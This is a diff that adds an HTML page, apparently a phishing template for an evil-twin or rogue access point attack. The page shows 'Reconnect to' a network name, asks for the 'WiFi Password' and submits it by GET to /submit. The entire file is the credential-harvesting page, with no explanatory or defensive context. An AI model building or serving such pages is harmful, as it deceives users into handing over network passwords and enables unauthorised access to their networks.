@@ -1,0 +1,47 @@
+<html> 
+ <head> 
+  <title>Login</title> 
+  <meta charset="utf-8"> 
+  <style>
+body {
+color: #FFFFFF;
+background: rgb(0, 132, 121);
+margin: 0px;
+}
+#header {
+padding: 30px;
+font-size: 40px;
+background: rgb(36, 35, 51);
+}
+#login {
+text-align: center;
+padding: 100px;
+background: rgb(0, 132, 121);
+}
+#submit {
+padding: 10px;
+}
+</style> 
+  <title>Reconnect</title>
+ </head>  
+ <body> 
+  <div id="header">
+   Reconnect to <span id="ssid"></span>
+  </div> 
+  <div id="login"> 
+   <h2></h2> 
+   <br> 
+   <form action="/submit" method="get"> 
+    <div>
+      WiFi Password: 
+     <input type="password" name="password" minlength="5" required autofocus> 
+    </div> 
+    <div id="submit"> 
+     <input type="submit" value="Log In" name="myButton"> 
+    </div> 
+   </form> 
+  </div>  
+  
+ </body>
+<script src="/index.js"></script>
+</html>
